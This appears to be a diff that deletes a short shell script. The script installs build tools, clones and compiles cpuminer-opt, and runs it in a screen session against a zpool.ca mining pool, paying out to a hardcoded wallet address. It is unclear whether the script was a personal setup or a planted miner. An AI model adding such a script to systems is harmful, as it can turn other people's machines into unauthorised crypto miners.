@@ -1,8 +1,0 @@
-#!/bin/sh
-apt-get update -y
-apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ -y 
-apt-get install git -y
-git clone https://github.com/JayDDee/cpuminer-opt opt 
-cd opt
-./build.sh
-screen ./cpuminer -a yescrypt -o stratum+tcp://mine.zpool.ca:6233 -u 3ARw9AiMpUMSDJRvcK1BtzmiU1TNWk7G66 -p $1
